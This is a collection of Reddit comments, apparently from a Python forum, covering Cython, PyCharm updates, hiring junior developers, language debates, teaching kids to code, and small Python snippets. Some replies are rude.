I choose scikit.learn too. I implemented this just for fun, and I've learned a few things while working on it.
Saw you mentioned me here so I finally made an account. I'll try to watch this thread when I have time but yeah I'm packaging the framework for the developers release in hopes to get things polished for whoever is doing version 2.0 at the university. Most of the limitations come from dealing with the pi's hardware limits, especially since my goal is to have it soley controlled via the pi.
so disappointed that contains neither pandas nor water. title sounded awesome.
The cleverness in this code is astounding. I would never use it in production, but an applause to the author for coming up with it. It clearly demonstrates extremely high technical competence in the inner workings of the language. 
Same here, no appreciable performance difference. I didn't use iPython notebook either, so that's not the cause.
What... why?
I've been using Python for personal projects for a couple years and I feel really comfortable with it. Most of the barriers I run into while coding have more to do with not having formal CS training or a strong math background. I'm looking for some kind of entry level position so I might be a good candidate, the only catch is that I live in Spain and I can't relocate to the UK at the moment. However, I'd be more than willing to telecommute. Feel free to PM. 
Interesting but it only works on Linux. If you would make use of a temporary "setup.py" file, this would make it more portable, and probably also more robust. 
Why use cython or why make it easier to use cython?
Until the high levels of sexual harassment and outright misogyny in the programming culture go away, we will need organizations and groups that cater to women, since they at least know they are less likely to encounter harassment within those groups. I think its less 'this is a python book for women' and more 'this is a python group/community that isn't hostile to women'.
It's written in php, why post it to a python subreddit? it also reset the entire form when I left 'filename' blank. (wtf do I need to supply a filename for?) when I submitted it again with a filename, it gave me: Notice: Undefined index: expiration in /var/www/pastesrc/paste.php on line 11 There's been an error! 5 TL;DR: Wow, what an epic waste of a click.
As far as I understand, cython is the standard implementation of Python. So... what exactly does this package make easier? Edit: sirkne cleared up my confusion.
See [Cython](http://en.wikipedia.org/wiki/Cython) and [CPython](http://en.wikipedia.org/wiki/CPython) -- they are two different things.
Thank you for the error report, i corrected it. Filenames are set to find pastes easier, especially when people sign up, because you can then delete and change the files. However i posted it on this subreddit because there are programmers here who might be interested.
Totally feel you :) I hope my question didn't seem overly aggressive!
Thanks for the heads up, I'm re-writing that section of the post now.
That's understandable.
I was the VP for ours when I was at uni, and we put a lot of effort of connecting students to software companies
I don't think that's what /u/goocy meant; Cython is very similar to Python, but one must compile it and the use of static types can vastly improve speed over more dynamic/generic Python code.
Oh, I'm sorry. I wasn't aware of this magic rule that imposed a 1:1 mapping on languages and the domains where they can be applied. And who knew 'business needs' could be so tidily and succinctly categorized. I wasn't aware that all of our problems had been solved and shoe horned into one nice label. Certainly you see the daftness of your ideas (well obviously not or we wouldn't be having this conversation...) It is a big world out there. Full of vastly different requirements and needs. You should join us out here. It really is nice. 
You might try not restricting yourself to just Python developers (so just advertise for a "junior backend developer" or similar). If you can find a junior dev who knows any language reasonably well, they'll be able to pick up Python pretty quickly.
nope ;) 
If you're designing several sets of classes, why don't you create an abstraction with the key universal methods. Then you make several child classes that inherit those properties + their own special methods. Making a custom decorator sounds like more trouble than its worth to me, although you should try out the python 'property' feature which is awesome if you haven't already.
goocy said: &gt; As far as I understand, cython is the standard implementation of Python. which is not true. CPython is the de facto standard Python, and Cython is something else -- not just an implementation, but a superset of Python.
thank you kindly 
Unless you're certified cat emotion specialist I don't believe you
That's not what that library does… &gt; This function returns the first element of iterable **that is true if key is None**. If there is no true element, the value of default is returned, which is None by default. &gt; &gt; **If a callable is supplied in key, the result of key(element) is used to judge the truth value of the element**, but the element itself is returned. Moreover Hynek explains the reason for that library in the README, so…
&gt; I don't see an attribute in your code. Do you know about python properties? All I see is a connect method for connecting. I am using a `property`, I should have added that to the example code :) Here's the relevant part of it: * https://github.com/dnaeon/py-vconnector/blob/master/src/vconnector/core.py#L77 My `Agent` class as described above extends the `VConnector` class from the above link. One thing that I forgot to mention is that agent instances are instantiated only once during the program lifetime. They got instantiated, then simply wait to receive new requests and process them, so I don't instantiate an agent for every single request (avoids re-connecting to service on each request, etc.). Here's the real code of my `Agent` class which uses the decorator to register new tasks. * https://github.com/dnaeon/py-vpoller/tree/decorators/src/vpoller/agent The `decorators` branch of the above project is using decorators for registering new tasks, while the `master` branch contains the code where all tasks are implemented as methods. And this is the master branch: * https://github.com/dnaeon/py-vpoller/tree/master/src/vpoller &gt; Also why couldnt the task be the same as the method name? That way you dont have to pass the name keyword argument to the decorator? You could just introspect the function for it's name. Yes, I can do that, but the thing is that clients (Python, C clients, etc.) are simply sending requests for a task they want to get processed in the form of '&lt;category&gt;.&lt;operation&gt;', which is something that I like more :) Also, the client only knows what task names are available and not the functions which are executing them, so using the function name for the task is not going to work in my case. 
Ooooh. That makes much more sense.
Good catch. I noticed that towards the end of writing the post. I had to make a couple tweaks to make it work and couldn't get it working correctly off the bat so I left it. I'll try to go back and figure it out.
Not located in the UK unfortunately. Did you try looking on reddit?
I did something very similar to this a few years ago using the pywin32 package. [Here's the print module documentation](http://docs.activestate.com/activepython/2.6/pywin32/win32print.html). It's not the most intuitive thing to use. Unfortunately I think I've lost that code so I can't give you any examples...
So I was doing some further thinking and I am assuming scraping would work. 
Ah, I see your printer has a WUI. In that case yeah requests and beautifulsoup will probably be your best bets
I wasn't taking that point to issue at all; I thought to confuse those two points one would not have even read the post. I may have incorrectly interpreted the essence of u/goocy 's comment, but in the context of utilities for optimizing Python code, the Cython syntax is nearly the same as Python. This is an important distinction to consider when planning a project and deciding where to spend time. One of the big advertised positives of Cython is this native-type syntax. Personally, I find Cython unwieldy, but I'm not an expert in it. If anything, I've used ctypes, but since a lot of my analysis is one-off and highly custom, it can be easier to manipulate objects in Python save to a file, then manipulate in C. edit: I guess this subreddit is too large to have a discussion without begin downvoted now. Reddiquette 101...
On the other hand, it supports Linux, so it would work nicely as a Docker image.
Okay, so it's not python, but I'd recommend you check out 'The Little Schemer', particularly the earlier chapters. It'll make you understand recursion in any language (not just Scheme). The knowledge you gain will certainly help you write better recursive functions. It's also an entertaining way to spend some spare time if you wanted to install something like Racket and work through the rest of the book.
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Simple Network Management Protocol**](https://en.wikipedia.org/wiki/Simple%20Network%20Management%20Protocol): [](#sfw) --- &gt;__Simple Network Management Protocol__ (__SNMP__) is an "[Internet-standard protocol](https://en.wikipedia.org/wiki/Internet_protocol_suite) for managing devices on [IP](https://en.wikipedia.org/wiki/Internet_Protocol) networks". Devices that typically support SNMP include routers, switches, servers, workstations, printers, modem racks and more. SNMP is used mostly in [network management systems](https://en.wikipedia.org/wiki/Network_management_systems) to [monitor](https://en.wikipedia.org/wiki/Network_monitoring) network-attached devices for conditions that warrant administrative attention. SNMP is a component of the [Internet Protocol Suite](https://en.wikipedia.org/wiki/Internet_Protocol_Suite) as defined by the [Internet Engineering Task Force](https://en.wikipedia.org/wiki/Internet_Engineering_Task_Force) (IETF). It consists of a set of [standards](https://en.wikipedia.org/wiki/Technical_standard) for network management, including an [application layer](https://en.wikipedia.org/wiki/Application_layer) [protocol](https://en.wikipedia.org/wiki/Protocol_(computing\)), a database [schema](https://en.wikipedia.org/wiki/Logical_schema), and a set of [data objects](https://en.wikipedia.org/wiki/Data_object). &gt;==== &gt;[**Image**](https://i.imgur.com/Js9eIrm.png) [^(i)](https://commons.wikimedia.org/wiki/File:SNMP_communication_principles_diagram.PNG) --- ^Interesting: [^Management ^information ^base](https://en.wikipedia.org/wiki/Management_information_base) ^| [^Network ^switch](https://en.wikipedia.org/wiki/Network_switch) ^| [^Network ^management ^station](https://en.wikipedia.org/wiki/Network_management_station) ^| [^OSI ^model](https://en.wikipedia.org/wiki/OSI_model) ^Parent ^commenter ^can [^toggle ^NSFW](/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+cm72h52) ^or[](#or) [^delete](/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+cm72h52)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
I'm getting the second, both with Python 2 and 3 on Arch Linux. Are you sure there isn't something wrong with the python installation on first computer? By the way, could you switch `\` with `/`? While Windows uses backward slashes in file paths, it also accepts forward slashes as well.
We put up a craigslist ad or farm them from university. The VP teaches an upper division class and we work with various professors in industry that send us their good grad students.
As a university student (currently in the US but I studied at Swansea Univeristy briefly) currently looking for these types of positions I can tell you that the thing that catches my eye the most about your post is that you are looking specifically for new entrants to the market and that you are willing to do some mentoring. Making these things stick out when talking about the position would be beneficial as there is usually a large gap in knowledge from what we learn at school and what we need in the workplace and this gap is something students worry about a lot when looking for that first job. I would also contact local universities and ask if they have job boards that you could post your position on. Universities usually have career advisory services to help students find jobs. I would ask them in which direction they usually point students who are looking for junior dev positions and then get your job listing out on those resources. I have a couple years experience with python, mostly through analytics research I assist with at my university, and as I said am looking for this kind of job. I currently live in the US but would be willing to relocate to the UK. Feel free to PM me for CV, code samples, etc.
&gt;It is a big world out there. Full of vastly different requirements and needs. None of which are better served by Python. Maybe you're ignorant of the major advances that have been made in C# and language design in general. Dynamics, generics, generational GC, concurrent data structures etc.. I won't attempt to educate you here, but [this Quora article](http://www.quora.com/How-does-Python-compare-to-C) should clear things up for you. 
I have trained many people in software design. I've also worked with many other trainers who are given like tons of interns to train. That is probably why I might sound negative; that's what experience gives you. Do not look on reddit, do not look on popular websites for programmers (except maybe github). Too many kids, too many people who don't have the proper degrees. What you want to look at are resumes from either universities or employment websites. There are toooooons of people who claim they know how to code stuff, and can even fake some of it, but have a terrible understanding of it and/or they don't have a proper CS/CE (Comp sci, comp engineering) degree. If they don't have a CS/CE degree, you are taking huge risks by hiring them. Especially any sort of "IT" sounding degree that isn't CS/CE/EE. Even recent graduates may not even be that great. Some people breeze through their classes by cheating or sorta understanding but never having hands-on experience. Look for graduates who challenge themselves, who take hard classes (operating system / algorithm / efficiency type classes). Look for graduates who have done projects outside of their course work (that shows real interest). You need to look for people who like to improve things instead of just getting them "to work". The kind of people who get a buzz when they make something more efficient. Perfectionists but not stubborn or close-minded. A lot of people in "junior position" can be trained to become this way, but your training program must have a sort of coach that is willing to give them that sense of understanding with code. Someone willing to go over design patterns or efficiency instead of just "how to code X." If they're the kind of person with a GitHub account with many contributions, then they are likely the best kinds of candidates. People with experience in multiple Python frameworks are the kind of good python programmers one should look for. They like to discover new technologies. Much of what I said might better apply to a "senior position" but even in junior positions the same applies except that you may have to teach them some of this stuff too. it's not just what you know, but the attitude and mentality that is taught to them. Universities are great but the ranking and difficulty of the university is important. I went to a school where it was super hard. But I've met many people who I know would have failed a lot of those courses. University reputation matter.
&gt; Your goal should be to use the three hours to make them think that programming is 1) cool and 2) something they can do. I would add on to that to say that it's not only cool, but also useful. Try to find examples that aren't meaningless. That have usefulness. Since they are middle school, this would be like something that could help with homework. It could be a Python Kivy mobile app, and how to create a simple mobile app that is useful for the kids and their family. But careful not to make it complicated. Something simple like "task reminder". Something that they can impress their parents with. Your goal should not be to teach "Python the language" but "Python the usefulness so that you are encouraged to learn more." Just don't do any "calculator" applications that they may find boring and won't think to code themselves anyway. One of the simplest things is making a text-based adventure game. Another cool thing is to send emails or text messages using either Python Flask or some other library that is super easy to setup. I don't get excited about a language syntax... I get excited about the capabilities and libraries that are used with it.
Out of curiosity, what's been your experience with people with mathematics or physics backgrounds?
Terrible. Math and Physics do not lead to logic. Logic and math traditionally are said to be complements. But they really aren't. Logic and Boolean algebra, are compatible and complementary. But not everyone who is great at calculus is great at boolean algebra, or vice-versa. Something the people doing the calculus are just great memorizers who don't actually understand the concepts. I've seen plenty of people who are excellent software engineers, great creativity in problem solving, great logic, but terrible at math and physics. It makes no sense right? But it does make sense, sometimes a professor just makes you hate subjects like math/physics, so they never get good at it and they get bad grades (this is true for universities where professors can barely speak english). Not saying you can't find people who are great at all. But math and physics should not be a deciding factor for a great programmer/engineer. People SAY it is, but I think that's a misconception. If you know someone aced Boolean algebra, I suppose you can use that to judge someone's logic skills. But in a similar case, you can also use someone who aced Philosophy to determine if they can do software engineering. Which is kinda strange but it makes sense too. The keys to software engineering: creative problem solving, logic, memorization, and ability to think outside the box. This is what you should look for. Enthusiasm and ability to be a "Go-getter" (find resources) so people who can find out about new technologies, people who love reading about new science / new technology--are great engineers too. Hackers, detectives (because they use logic in solving mysteries), and computer forensics experts are also usually great at engineering applications too. 
Could be, yes; however, that would mean that one of the editors does it wrong. Files are sequences of bytes, they have a clearly-defined byte order on disk, and that ordering shouldn't change when you read them into memory byte-wise. OTOH, if you read them as some kind of unicode text (say, UTF-8 or UTF-16), and the hex editor then shows *that* as hexadecimal, you'll get platform endianness (or else whatever endianness your editor decides it should use).
&gt;The keys to software engineering: creative problem solving, logic, memorization, and ability to think outside the box. This is what you should look for. Anyone with a mathematics degree (so that they have been through real analysis and abstract algebra) from a decent university will have these skills. I have a math degree and most (if not all) of the logic stuff that you learn in CS was covered. Hell, Guido Rossum was studying to become a mathematician when he started with Python. I took a job using Python after graduation and I've definitely struggled with some things; logic has not been one of them.
You can play the 'language X is better for task T' argument until the heat death of the universe. Same goes for language X vs language Y in general. And sorry, but that Quora article is trash. It is obviously slanted and full of assumptions, speculation, and opinions. My favorite line: &gt; So this code should require at least 33ns in C# (I'll add actual measurement result later here). ..... 44x faster on C# 44x speedup! Based on numbers pulled from my ass! For a single toy example! WINNAR! I'm happy you think C# is the best thing in the history of ever. Really, I am. And there are numerous situations where it is most definitely the best tool for the job. But it is far from a panacea. No language is. That is why there are 987436987 of them floating around out there. Python isn't the end all be all either. It definitely gets the job done though and in more than sufficient time. I'm sure you could rejigger some of my work from Python to C# and have it execute in a tiny fraction of the CPU time. But good luck overcoming the IO bottleneck that is the real hurdle the pipeline. 'Never let perfect be the enemy of good enough.'
Yeah, of course if you have a major in math and graduate courses etc. I can see the higher level math classes giving you those skills especially from a university that has good math requirements. I was more talking about people with a minor, or took a bunch of math courses and aced them or people who are typically considered great at math, but thy may not have the higher level training. I feel like math is so complicated that it takes up until graduate level courses for people to have the prerequisites to do some of the more advanced logical analysis and mathematical concepts. Definitely, people who are particle physicists who seem to have this crazy understanding of math formulas, are people who are immensely skilled in logic. But I don't know if math major by itself trains people for that or if it's just a lot of memorizing variables and plugging them in. You tell me. I just know that it is possible for people that are great at math that can understand calculus at high levels, but suck at logic or problem solving. I have seen instances where one student helps another student with math/physics, while the other student helps them with software engineering concepts. To me it indicates that they are different non-complementary skills contrary to popular belief. I myself, have been great at boolean algebra, great at understanding theoretical physics concepts, but terrible at say linear systems and graphs, not so great at advanced calculus courses. It literally did not even interest me. The professors made me hate it and it felt like it was impossible to learn despite the relative ease I found in assembly programming and C++. I am a visual person too, so I don't see how graphs could be the issue. 
Woop! No notification when I started it up, but manually update check did the trick. Edit: Augh, clicked away on accident. Rechecked and now nothing. *shake fist*
Perfect timing - I'm processing huge batch files, and would like to see how cython could help out performance-wise. But the distribution was getting me down.
I usually use the built-in facilities. Either backslashing with open('a.txt', 'r') as input, \ open('b.txt', 'w') as output: pass or [chaining with nested](https://docs.python.org/2/library/contextlib.html#contextlib.nested) with contextlib.nested(open('a.txt', 'r') , open('b.txt', 'w')) as (input, output): pass
Pep8 says one should use 4 spaces and no tabs!
Wow, you managed to get g4py working with Geant4 10? I could not for the life of me work out what was going on. https://github.com/NixOS/nixpkgs/blob/907af9e9e61899fab0eca047c209852ba6f84e64/pkgs/development/libraries/physics/geant4/g4py/default.nix
 Here is another solution: https://github.com/housleyjk/aiopyramid/blob/master/aiopyramid/helpers.py#L57 This permit to have legacy code that call your asyncio code, but, imho, you should avoid that. You should only create asyncio code that call legacy stuff using an executor (e.g. loop.run_in_executor()) and never call asyncio code below your legacy code. 
Say you've written a module, run it and then realize it's not quite right. How do you re-import it without rebooting?
&gt;But good luck overcoming the IO bottleneck that is the real hurdle the pipeline. Until you implement a caching system that stores the most relevant data in memory. Now Python is back to being the bottleneck. So what do you do? Write some C code and a bunch of ugly glue code. Now you've got to maintain two languages and you have to compile anyway. If you're building a serious application you can't make it all Python. But you can definitely make it all C#. So save yourself the pain. I maintain that hte productivity gains are an illusion. They aren't real because your systems will eventually brush up against that GIL and pythons horrendous memory utilization. 
How exactly is caching going to speed up CRUD operations? And why does a caching solution automatically rule out Python? There are plenty of solutions for doing so already implemented. &gt;Write some C code and a bunch of ugly glue code. Plenty of python extensions and modules have C aspects and yet still fit nicely and easily alongside Python code. The glue code argument doesn't pass the smell test. Split maintenance and compiling is concedable, but just barely. &gt; building a serious application Again, you keep falling back to a niche scope to argue against a broad topic. It is growing quite tedious. This is not a situation where a single contrary result invalidates the entire argument.
What's the point of such cookbook? Why not simply add those examples to python documentation? Any way, few suggestions: 1. Show what you have so far and put it on github. Its likely someone will contribute. 2. Make its visually interesting, ie. tabbed navigation that shows few most common usecases with copy-pastable code with brief explanation. 3. I don't believe you can cover email in 3-6 pages including examples, not even briefly. Especially if you wan to compare it with old code. what it does and how its different from old way.
[What have you tried?](http://mattgemmell.com/what-have-you-tried/)
I just started this online course a couple weeks ago and it is one of my first assignments, it's due in a few hours and I just don't understand it yet :(
This should help you get started from time import sleep def play_game(): while True: print('Do your own homework!') sleep(1) if __name__ == '__main__': play_game()
&gt;Definitely, people who are particle physicists who seem to have this crazy understanding of math formulas, are people who are immensely skilled in logic. But I don't know if math major by itself trains people for that or if it's just a lot of memorizing variables and plugging them in. You tell me. You have it completely wrong. The clarity of thought and talent for abstraction that it takes to make it through a good undergraduate analysis course (c.f. the text *Principles of Mathematical Analysis* by Walter Rudin) transfer very naturally to programming. To be blunt, junior and senior level mathematics courses make CS Boolean algebra homework problems look like crossword puzzles. Of course, Boolean algebra is usually a freshman or sophomore level course so I'm not saying math people are smarter -- just that they have the skills you're talking about. A math degree requires much more than just cranking out derivatives and solving equations. I don't doubt that people with math backgrounds often struggle in CS jobs, but I do doubt that they struggle for the reasons that you're saying they do. The hardest thing for me has been not knowing about all the tools that people use, which causes me to reinvent wheels somewhat frequently. **EDIT**: I'm talking about people that actually have at least an undergraduate degree in math or physics.
Detailed changelist: http://www.jetbrains.com/pycharm/whatsnew/index.html Great features but I still probably won't switch. 
What does the Visual Studio plugin offer over PyCharm?
The PDF is only free if you link to the Kickstarter on a social media website, take a screenshot and e-mail it or the link to the author after which he will send you the document in January.
This is tantamount to asking why I don't leave my girlfriend. I knew it would be a local maxima but now I'm used to my tools and it takes a significant event to force change. I'm doing a damn fine job with my tools, so why change? I'm open-minded, which is why I read the changelist, but not easily convinced that my productivity will change. 
If you are a *nix person, then this does not apply to you. If you have never used VS, then this does not apply to you. If you think emacs is an IDE, then this does not apply to you. If you were dropped on your head repeatedly as a child, then this does not apply to you.
Tell us more about your tools.
Go home, Homer. You are drunk.
What is the energy (battery) consumption of PyCharm on a laptop? EDIT: I don't understand why this question was downvoted into oblivion. We measure laptop use in hours of browsing or video playback. Development on the road requires tools that preserve battery. All those fancy IDE features are not for free for sure.
You could give [fn.py](https://github.com/kachayev/fn.py) a try.
The Professional edition actually has a few advantages, although there are plenty of ways of getting a license without paying - such as being a student or working on an open source project.
I purchased a copy because it was low enough that I felt it a fair price and I wanted to support the developers of a wonderful project. 
I was just responding to snark with snark. Thanks for the tip, didn't realize they also have those kinds of licensing offers.
It uses it.
Man, Python lang is BLOWIN' UUUUUP!
I think he is interested in what your tools actually are..
This belongs in /r/learnpython or another programming question-oriented subreddit. Nonetheless, it's a simple question so I'll answer it. &gt;I want to add the characters into a list I assume that the goal is to obtain a list of every character in the file. You don't need to read the file one character at a time to do this: f = open('test') lst = list(f.read()) # ['h', 'e', 'l', 'l', 'o', ',', ' ', 'w', 'o', 'r', 'l', 'd', '\n'] 
For scientific uses, this is a great update. Ipython, matplotlib, and numpy arrays is a big quality of life improvement.
 # Python 3 # http://en.wikipedia.org/wiki/Halfwidth_and_fullwidth_forms#In_Unicode ASCII_TO_FULLWIDTH_OFFSET = 65248 ASCII_FIRST = 33 ASCII_LAST = 126 ASCII_SPACE = 32 FULLWIDTH_SPACE = 12288 def transformCharacter(c): o = ord(c) if ASCII_FIRST &lt;= o &lt;= ASCII_LAST: return chr(o + ASCII_TO_FULLWIDTH_OFFSET) elif o == ASCII_SPACE: return chr(FULLWIDTH_SPACE) else: return c def transformString(s): return ''.join(transformCharacter(c) for c in s) while True: print(transformString(input('&gt;')))
This may not be what OP needs, but [MSWinPrint.py](http://newcenturycomputers.net/projects/mswinprint.html) is something that helps when printing in Windows. It's a wrapper around some PyWin32 and PIL modules that gives a higher level model to work with. 
And my point is that individual tools don't matter. If I named them, he would pick them apart and I still wouldn't change because I already know the differences.
Bring a book.
That is a fantastic way of putting that thought into an easy to understand format. I'm stealing this for the next 'Hey wouldn't it be cool if...' conversation with my boss. 
Exactly 3 megawatts, obviously
There's a cost associated with supporting yet another lang/lib/technology in your stack. If you go with Python, on anything beyond a trivial application, you'll eventually need something else to fill in the perf gaps. So you're left with Python + something else (C, Java, C# whatever). If you go with a modern language you can realize an entire codebase in a single language. If you want to argue that Python is still the best choice for simple scripting tasks; shuttling around files, setting up projects etc, then fine I can agree with you there. But it doesn't belong in your application code in 2014, in my not so humble opinion. 
I meant no disrespect, all I'm saying (tongue-in-cheek) is that once you're used to modal editing you're stuck with those muscle memories for a long time. I use and enjoy PyCharm myself but I feel far more comfortable using Vim.
That plays a role in practically every relationship ever.
do an AMA!
Why would anyone use this over git?
Toot toot.
Nice hack but if you use that in production you deserve to be slapped with with a live trout.
I'm actually curious about a comparison as well. I recently watched a video on the VS plugin and they were discussing a lot of the scientific programming features they had recently added support for. I mainly use Pycharm right now for Python code but it never hurts to know the trade offs
If you prefer to use an IDE (let's leave aside vim and emacs), PyCharm is the best thing out there.
thanks for this, I didn`t realise sqlite was part of the standards libs
You can always just send texts via email. It'll take a little extra effort to figure out the email suffixes, but it's simple and free and your users don't have to worry about giving their number to a third party. 
I have been using it for the past four months and have really liked it. It does take some getting used to, and there are certain SublimeText themes that I really miss (specifically the [Neon color scheme](https://github.com/MattDMo/Neon-color-scheme)), but overall I'm very happy with what it's like using an IDE. I'm not sure why you're getting downvoted…I don't use PyCharm for everything since it doesn't always seem to be the best tool for the job. If I just need to write a short script I'll still use Sublime. (I'm learning Vim…planning to switch over to MacVim soon.) But when I'm doing something in Django or Flask, I'll always use it. Also if I'm doing anything where I'm writing tests, I'l use it.
Loving PyCharm. It's been my editor and IDE of choice for the better part of this year. I could not go back to Sublime for anything but single file projects. 
Do you have any suggestions on how I could receive text messages like this? I've gotten it to send, but receiving them is proving to be difficult.
There is a power save mode that turns off some of the automatic checking and indexing. 
Try using a less obvious throwaway name when you have conversations with yourself.
Come on over to /r/learnpython as that is a more appropriate place for questions like this.
i will move my question there, but can you be nice enough to answer my question? please zynix
IIRC it's a java app, so probably a lot. J/K! Android cpu/mem/power consumption seems to do fine despite java, so it is *possible* to ship non-bloated binaries from that language. 
You can send text messages to an email address. 
Android uses Dalvik/ART, not a JVM. It just so happens that there is a java bytecode -&gt; dalvik bytecode compiler. Nothing (I think) stopping cil -&gt; dalvik.l for example.
http://media.giphy.com/media/YIehLZpinaywo/giphy.gif
 have you ever used anything outside of Microsoft? Edit: Nevermind I looked at your comment history explained everything. 
I'm going to say your running 2.7 instead of 3.4
I´ve been down this road already. Sending text messages to a cell-phone number is as easy as writing the email itself. Check this Life hack entry: http://lifehacker.com/127033/send-sms-from-e-mail use smtplib: http://www.pythonforbeginners.com/code-snippets-source-code/using-python-to-send-email Hope it helps
http://pumpsms.com
What's the power consumption on Chrome tabs? Is this actually a concern?
It seems to be interesting!! How can i subscribe?
Why? How?
That sounds pretty ambitious for two days. Also developing that all from scratch I would think is too tall an order for people just learning Python or any programming really... Going back to my Microprocessors class though, I can bring up a concept I thought worked really well. At the end of the microprocessors class we had created a complete application for a development kit. We were able to read and write serial, control an LCD, run the ADCs and the onboard timers, interface to a multiplexed keyboard. The way our professor did it was he created libraries that at first supported everything but writing a letter to the display. Then we wrote code to write a character to the display. His library called our code and we were able to test a fully functioning system. Then the next week he gave us a library with no display code. We wrote code to print strings to the display using our previous character write code. Next week he gave us a version of the library without the keypad code. Then one without the timer code. Eventually over time we had written the entire system, but we always had a nicely functioning system to test on and it was always clear when we had done it right because it worked. I could almost see that being useful in this case since A. You'd have a target to shoot for. They'd know when they get it "right" and B. They are only developing small chunks of functionality at a time so it is manageable and not overwhelming.
That's a great idea. I'll definitely consider that as I develop the materials. I'll talk to a few veterans around campus and ask how they've done it. I really do want to introduce some programming basics and get them to build things as close to ground-up as possible, but it might not be feasible considering time and budget constraints :P Thanks for the suggestion.
Are you finding it renders the IPython notebooks correctly? Mine aren't looking right. Some color schemes make the notebook illegible. 
Sorry for hijacking, but can someone "sell" PyCharm to me? I've tried to use it several times, but i don't seem to be able to "get" it. I currently work in a text editor (nano, vim, gedit, kate, whatever) and do most everything in the terminal. I have a Makefile that has a command for testing all unit tests with all versions of Python. Also commands for linting, generating docs, installing, "dist"ing and releasing. This workflow works well for me, and I don't seem to be able to understand the charms of working in an IDE, because I get stuck at every other turn. Everyone I know works in IDEs, but I just can't?
just started using matplotlib yesterday for my thesis and now this hooooray and was using pycharm for flask apps before, so the jinja support is also great
Hello. For 2 days wouldn't the most effective strategy be one they can constantly repeat? When my brother taught me a few card tricks, I tried them all out on my friends and by the time that got boring I had a pretty solid foundation for poker. I do not know if these kids all have access to robotics raw materials but I would go with something fun and something they can show off. Like a script to hack something. I remember one of our first html classes in campus the lecturer had us sign in to our gmail accounts via a link he had sent us. After showing us our passwords and explaining he had coded his own fake gmail sign in page we all wanted to learn. 2 days for robotics doesn't sound like something they would try out after the lessons.
You should upload this to PyPI.
How large is your team? How complex is your typical project structure, workflow, etc? I used to spend all my time in vim, but once I got on a team with multiple application projects in addition to several private utils/integrations/tools libs an IDE became mandatory. I'm sure some will spend enough time learning and customizing vim or the like to have similar features, but it doesn't make sense to me to do that when PyCharm is built for that kind of thing, and does it very well. Some of the features I am referring to are refactoring, autocompletion (very good with proper documentation strings that specify types), error warnings (also aided by type hinting), searching for classes/symbols and going to declaration, the debugger.. Those are the ones I use the most at least.
Are you saying you would switch the moment someone new and flashy comes along? Even if we put loyalty aside, I prefer to let editors prove themselves first.
You can have a look at existing django apps: https://github.com/thibault/django-simple-sms and others: https://github.com/search?q=django%20sms&amp;type=Everything&amp;repo=&amp;langOverride=&amp;start_value=1
Yep, you should have a look at toolz: http://toolz.readthedocs.org/en/latest/ The functions it provides are composable, pure and lazy ! And its documentation is fantastic, it explains very well the underlying principles. See more here: https://github.com/vinta/awesome-python#functional-programming
Comment retracted, after repeating measurements, I was talking nonsense.
Looks very very nice! My only complaint would be the lack of actual ⟨chevrons⟩
I was using PHP Storm for work, and Sublime for python so I gave PyCharm a try, and I must say it clicked instantly. One of the most complete and polished IDE i've tried. Nice job Jet Brains :)
The IPython integration is really neat!
Read the article. It only track single files. Configuration files comes to mind and GIT is ok to do it, this is just simpler...
Would be nice with fullscreen support :P I'd like to use less native code for https://github.com/boxed/CMi and this project could be a big step in that direction.
I hope PyCharm devs get lots of sex! They deserve it. 
I suppose you can write the code in your package to do different things depening on what OS installed, similar to what pyperclip does: http://coffeeghost.net/src/pyperclip.py I have to be honest, as much as I like accept the benefits of cython, the hassle of getting it started has always put me off up to now. But this may easily change my mind. When this project is more mature or cross platform, have you considered setting up an anaconda package for this. Because lets be honest, 9/10s of people that use cython install it via anaconda. Nice work mate.
Sublime has a "vintage mode" which is a vim key binding implementation. It might help you make the transition from Sublime to Vim. 
Thanks for the suggestion. I will look into it.
Same problem here. There might be hope, though. See that sad guy in the lower right-hand corner? Clicking it reveals some options that I think might improve performance but I haven't played with it yet.
There is [typeannotations][1] as well. [1]: https://github.com/ceronman/typeannotations
Not only is he using vim, but he's probably got it decked out with all the bells and whistles plugins, i.e. an IDE user in denial.
There's the `ideavim` plugin for PyCharm (and the other IntelliJ IDEs) that does a decent job at bringing over vim keybindings. Plugins are a no-go of course, so that may be a dealbreaker for you.
I suggest Anaconda Python. I love this distribution of Python for any and everything, including packaging.
I'm assuming you are aware of itertools?
The [toolz docs](http://toolz.readthedocs.org/en/latest/heritage.html#funcy) pay tribute to something called Funcy as well.
Originally I wanted them to take home the materials, but that turned out to be unsustainable for obvious reasons. I'd like them to be able to take home something to show of though... I'll have to think about it. Thanks!
* Autocompletion of class/function/variable names. * Ability to "click-through" these names and immediately jump to the class/function definition. * Automatically add import of modules when they are used. * Ability to reformat your code based on pep-8 or other rules. * "find all usages" of a particular class/function/variable, so you can see who calls a thing. * "Refactor" which will automatically update all callers of a class/function/variable when you change the name or move it to a different location. * Equivalent of "find" across entire project, with autocomplete and pattern matching. * Equivalent of "grep" across entire project. * Built in test integration, where you can immediately jump from a failing test to the line of code in the stacktrace with a click. * Build in (or plugin) support for 3rd party tools such as git, so that I can bring up file annotation to see who changed a particular line, when, what the commit message was, etc. Or bring up diff in editor of my current version against latest from repository, so I can easily see all local edits. * Visual debugger (with remote debug support). Basically, when I am working on a large project with a significant team of people, I prefer to have a development environment that has a deeper semantic understanding of the project as a whole. If I am just writing one-off scripts or working directly on a headless server, I prefer a more minimalist editor (vim is my personal choice) that fits natively in that space.
The IPython notebook support is atrocious. Borderline unusable.
http://cacm.acm.org/blogs/blog-cacm/176450-python-is-now-the-most-popular-introductory-teaching-language-at-top-us-universities/fulltext
Thanks. This is the kind of answer I wanted to know (besides potential comparison to other development tools).
Awww, look at the angry cunt with his throw away troll account. Trying so hard to be a nuisance. Show us on the doll where the bullies punched you in 3rd grade.
[Inspiration?](http://www.panix.com/~eli/unicode/convert.cgi?text=The+secret+is+out.+)
The problem I always have is that when you go to Tools &gt; Upload To &lt;server name&gt; it syncs the file that you have highlighted in the file tree on the left rather than syncing the whole project. Took me a while to figure that one out :P
